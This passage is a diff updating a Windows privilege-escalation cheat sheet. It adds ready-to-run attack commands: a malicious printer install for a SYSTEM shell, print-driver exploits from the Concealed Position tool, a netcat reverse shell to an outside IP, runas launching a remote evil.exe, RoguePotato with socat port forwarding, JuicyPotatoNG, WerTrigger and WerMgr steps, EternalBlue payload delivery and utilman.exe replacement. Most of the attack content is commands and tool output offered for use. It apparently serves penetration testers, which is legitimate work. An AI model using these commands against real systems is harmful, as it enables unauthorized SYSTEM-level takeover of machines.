+[+] Copying 64mimispool.dll to C:\Windows\system32\spool\drivers\x64\3\6cfbaf26f4c64131896df8a522546e9c.dll
+[+] Copying 32mimispool.dll to C:\Windows\system32\spool\drivers\W32X86\3\6cfbaf26f4c64131896df8a522546e9c.dll
+[+] Adding printer driver => Generic / Text Only!
+[+] Adding printer => EasySystemShell!
+[+] Setting 64-bit Registry key
+[+] Setting 32-bit Registry key
+[+] Setting '*' Registry key
+```
+
+```ps1
+PS C:\target> $serverName  = 'printer-installed-host'
+PS C:\target> $printerName = 'EasySystemShell'
+PS C:\target> $fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
+PS C:\target> Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
+PS C:\target> Add-Printer -ConnectionName $fullprinterName
+```
+
+### Bring Your Own Vulnerability
+
+Concealed Position : https://github.com/jacob-baines/concealed_position
+
+* ACIDDAMAGE - [CVE-2021-35449](https://nvd.nist.gov/vuln/detail/CVE-2021-35449) - Lexmark Universal Print Driver LPE
+* RADIANTDAMAGE - [CVE-2021-38085](https://nvd.nist.gov/vuln/detail/CVE-2021-38085) - Canon TR150 Print Driver LPE
+* POISONDAMAGE - [CVE-2019-19363](https://nvd.nist.gov/vuln/detail/CVE-2019-19363) - Ricoh PCL6 Print Driver LPE
+* SLASHINGDAMAGE - [CVE-2020-1300](https://nvd.nist.gov/vuln/detail/CVE-2020-1300) - Windows Print Spooler LPE
+
+```powershell
+cp_server.exe -e ACIDDAMAGE
+# Get-Printer
+# Set the "Advanced Sharing Settings" -> "Turn off password protected sharing"
+cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
+cp_client.exe -l -e ACIDDAMAGE
 ```
 
 ## EoP - Runas
@@ -820,6 +1105,7 @@ Then you can use `runas` with the `/savecred` options in order to use the saved 
 The following example is calling a remote binary via an SMB share.
 ```powershell
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+runas /savecred /user:Administrator "cmd.exe /k whoami"
 ```
 
 Using `runas` with a provided set of credential.
@@ -885,7 +1171,7 @@ Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary bel
 |`SeBackup`| **Threat** | ***Built-in commands*** | Read sensitve files with `robocopy /b` |- May be more interesting if you can read %WINDIR%\MEMORY.DMP<br> <br>- `SeBackupPrivilege` (and robocopy) is not helpful when it comes to open files.<br> <br>- Robocopy requires both SeBackup and SeRestore to work with /b parameter. |
 |`SeCreateToken`| ***Admin*** | 3rd party tool | Create arbitrary token including local admin rights with `NtCreateToken`. ||
 |`SeDebug`| ***Admin*** | **PowerShell** | Duplicate the `lsass.exe` token.  | Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) |
-|`SeLoadDriver`| ***Admin*** | 3rd party tool | 1. Load buggy kernel driver such as `szkg64.sys`<br>2. Exploit the driver vulnerability<br> <br> Alternatively, the privilege may be used to unload security-related drivers with `ftlMC` builtin command. i.e.: `fltMC sysmondrv` | 1. The `szkg64` vulnerability is listed as [CVE-2018-15732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732)<br>2. The `szkg64` [exploit code](https://www.greyhathacker.net/?p=1025) was created by [Parvez Anwar](https://twitter.com/parvezghh)  |
+|`SeLoadDriver`| ***Admin*** | 3rd party tool | 1. Load buggy kernel driver such as `szkg64.sys` or `capcom.sys`<br>2. Exploit the driver vulnerability<br> <br> Alternatively, the privilege may be used to unload security-related drivers with `ftlMC` builtin command. i.e.: `fltMC sysmondrv` | 1. The `szkg64` vulnerability is listed as [CVE-2018-15732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732)<br>2. The `szkg64` [exploit code](https://www.greyhathacker.net/?p=1025) was created by [Parvez Anwar](https://twitter.com/parvezghh)  |
 |`SeRestore`| ***Admin*** | **PowerShell** | 1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with [Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)).<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
 |`SeTakeOwnership`| ***Admin*** | ***Built-in commands*** |1. `takeown.exe /f "%windir%\system32"`<br>2. `icalcs.exe "%windir%\system32" /grant "%username%":F`<br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
 |`SeTcb`| ***Admin*** | 3rd party tool | Manipulate tokens to have local admin rights included. May require SeImpersonate.<br> <br>To be verified. ||
@@ -921,7 +1207,6 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
 c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
 ```
 
-
 ### Meterpreter getsystem and alternatives
 
 ```powershell
@@ -934,8 +1219,8 @@ python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
 
 ### RottenPotato (Token Impersonation)
 
-Binary available at : https://github.com/foxglovesec/RottenPotato
-Binary available at : https://github.com/breenmachine/RottenPotatoNG
+* Binary available at : https://github.com/foxglovesec/RottenPotato
+* Binary available at : https://github.com/breenmachine/RottenPotatoNG
 
 ```c
 getuid
@@ -954,10 +1239,12 @@ Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -n
 ```
 
 
-### Juicy Potato (abusing the golden privileges)
+### Juicy Potato (Abusing the golden privileges)
 
-Binary available at : https://github.com/ohpe/juicy-potato/releases    
-:warning: Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809 +. 
+> If the machine is **>= Windows 10 1809 & Windows Server 2019** - Try **Rogue Potato**    
+> If the machine is **< Windows 10 1809 < Windows Server 2019** - Try **Juicy Potato**
+
+* Binary available at : https://github.com/ohpe/juicy-potato/releases    
 
 1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)
 
@@ -987,6 +1274,47 @@ Binary available at : https://github.com/ohpe/juicy-potato/releases
         {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
         [+] CreateProcessWithTokenW OK
     ```
+
+### Rogue Potato (Fake OXID Resolver)
+
+* Binary available at https://github.com/antonioCoco/RoguePotato
+
+```powershell
+# Network redirector / port forwarder to run on your remote machine, must use port 135 as src port
+socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999
+
+# RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. 
+# Use this if you have fw restrictions.
+RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
+
+# RoguePotato all in one with RogueOxidResolver running locally on port 9999
+RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999
+
+#RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename
+RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
+```
+
+### EFSPotato (MS-EFSR EfsRpcOpenFileRaw)
+
+* Binary available at https://github.com/zcgonvh/EfsPotato
+
+```powershell
+# .NET 4.x
+csc EfsPotato.cs
+csc /platform:x86 EfsPotato.cs
+
+# .NET 2.0/3.5
+C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe EfsPotato.cs
+C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe /platform:x86 EfsPotato.cs
+```
+
+### JuicyPotatoNG
+
+* [antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)
+
+```powershell
+JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
+```
 
 
 ## EoP - Privileged File Write
@@ -1032,12 +1360,22 @@ If we found a privileged file write vulnerability in Windows or in some third-pa
 
 ### WerTrigger
 
-> Weaponizing for privileged file writes bugs with Windows problem reporting
+> Exploit Privileged File Writes bugs with Windows Problem Reporting
 
 1. Clone https://github.com/sailay1996/WerTrigger
 2. Copy `phoneinfo.dll` to `C:\Windows\System32\`
 3. Place `Report.wer` file and `WerTrigger.exe` in a same directory.
 4. Then, run `WerTrigger.exe`.
+5. Enjoy a shell as **NT AUTHORITY\SYSTEM**
+
+### WerMgr
+
+> Exploit Privileged Directory Creation Bugs with Windows Error Reporting
+
+1. Clone https://github.com/binderlabs/DirCreate2System
+2. Create directory `C:\Windows\System32\wermgr.exe.local\`
+3. Grant access to it: `cacls C:\Windows\System32\wermgr.exe.local /e /g everyone:f`
+4. Place `spawn.dll` file and `dircreate2system.exe` in a same directory and run `.\dircreate2system.exe`. 
 5. Enjoy a shell as **NT AUTHORITY\SYSTEM**
 
 
@@ -1124,10 +1462,10 @@ Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc
 
 ### MS17-010 (Eternal Blue)
 
-Check the vulnerability with the following nmap script.
+Check the vulnerability with the following nmap script or crackmapexec: `crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M ms17-010`.
 
 ```c
-nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 <ip_netblock>
+nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 <ip_netblock>
 ```
 
 Metasploit modules to exploit `EternalRomance/EternalSynergy/EternalChampion`.
@@ -1154,7 +1492,7 @@ python2 send_and_execute.py 10.0.0.1 revshell.exe
 
 Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html
 
-Working on :
+Requirement:
 - Windows 7 
 - Windows 10 LTSC 10240
 
@@ -1165,11 +1503,11 @@ Failing on :
 
 Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege
 
+
 ## References
 
-* [Windows Internals Book - 02/07/2017](https://docs.microsoft.com/en-us/sysinternals/learn/windows-internals)
 * [icacls - Docs Microsoft](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
-* [Privilege Escalation Windows - Philip Linghammar](https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html)
+* [Privilege Escalation Windows - Philip Linghammar](https://web.archive.org/web/20191231011305/https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html)
 * [Windows elevation of privileges - Guifre Ruiz](https://guif.re/windowseop)
 * [The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte](https://addaxsoft.com/wpecs/)
 * [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
@@ -1194,8 +1532,14 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [Pentestlab.blog - WPE-13 - Intel SYSRET](https://pentestlab.blog/2017/06/14/intel-sysret/)
 * [Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @_xpn_](https://blog.xpnsec.com/becoming-system/)
 * [Living Off The Land Binaries and Scripts (and now also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
-* [Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec](https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html)
+* [Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec](https://web.archive.org/web/20191105182846/https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html)
 * [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
-* [Abusing Diaghub - xct - March 07, 2019](https://vulndev.io/howto/2019/03/07/diaghub.html)
+* [Abusing Diaghub - xct - March 07, 2019](https://vulndev.io/2019/03/06/abusing-diaghub/)
 * [Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html)
 * [Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019](https://itm4n.github.io/usodllloader-part2/)
+* [Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows](https://www.elladodelmal.com/2020/03/hacking-trick-environment-variable-path.html?m=1)
+* [Abusing SeLoadDriverPrivilege for privilege escalation - 14 JUN 2018 - OSCAR MALLO](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
+* [Universal Privilege Escalation and Persistence – Printer - AUGUST 2, 2021)](https://pentestlab.blog/2021/08/02/universal-privilege-escalation-and-persistence-printer/)
+* [ABUSING ARBITRARY FILE DELETES TO ESCALATE PRIVILEGE AND OTHER GREAT TRICKS - March 17, 2022 | Simon Zuckerbraun](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
+* [Bypassing AppLocker by abusing HashInfo - 2022-08-19 - Ian](https://shells.systems/post-bypassing-applocker-by-abusing-hashinfo/)
+* [Giving JuicyPotato a second chance: JuicyPotatoNG - @decoder_it, @splinter_code](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
